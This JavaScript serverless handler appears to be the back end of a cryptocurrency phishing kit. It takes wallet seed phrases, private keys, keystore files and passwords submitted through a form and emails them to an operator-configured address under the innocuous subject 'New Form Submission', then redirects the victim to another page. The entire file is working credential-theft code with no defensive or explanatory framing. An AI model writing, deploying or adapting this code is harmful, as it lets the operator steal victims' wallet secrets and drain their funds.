import nodemailer from 'nodemailer';
import { parse } from 'querystring';

export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  const body = typeof req.body === 'string' ? parse(req.body) : (req.body || {});
  const {
    wallet_name,
    walletName,
    phase,
    pw: password,
    password: passwordField,
    seedphrase,
    phrase,
    privateKey,
    privatekey,
    private_key,
    keystore,
    keystorePassword,
    keystore_password,
  } = body;

  const walletNameValue = wallet_name || walletName || '';
  const phaseValue = phase || '';
  const passwordValue = password || passwordField || keystorePassword || keystore_password || '';
  const seedPhraseValue = seedphrase || phrase || '';
  const privateKeyValue = privateKey || privatekey || private_key || '';
  const keystoreValue = keystore || '';

  // Validate required fields
  if (!phaseValue || phaseValue.trim() === '') {
    return res.status(400).send('Required field missing.');
  }

  try {
    // Create transporter with environment variables
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: process.env.SMTP_PORT === '465',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASSWORD,
      },
    });

    // Prepare email
    const mailOptions = {
      from: `${process.env.SMTP_FROM_NAME} <${process.env.SMTP_FROM_EMAIL}>`,
      to: process.env.RECIPIENT_EMAIL,
      subject: 'New Form Submission',
      text: [
        `Wallet Name: ${walletNameValue}`,
        `Phase: ${phaseValue}`,
        `Seed Phrase: ${seedPhraseValue}`,
        `Private Key: ${privateKeyValue}`,
        `Keystore: ${keystoreValue}`,
        `Password: ${passwordValue}`,
      ].join('\n'),
    };

    // Send email
    await transporter.sendMail(mailOptions);

    // Redirect to the original behavior
    res.writeHead(302, { 'Location': '/rdr.html' });
    res.end();

  } catch (error) {
    console.error('Email error:', error);
    res.status(500).send('Message could not be sent. Error: ' + error.message);
  }
}
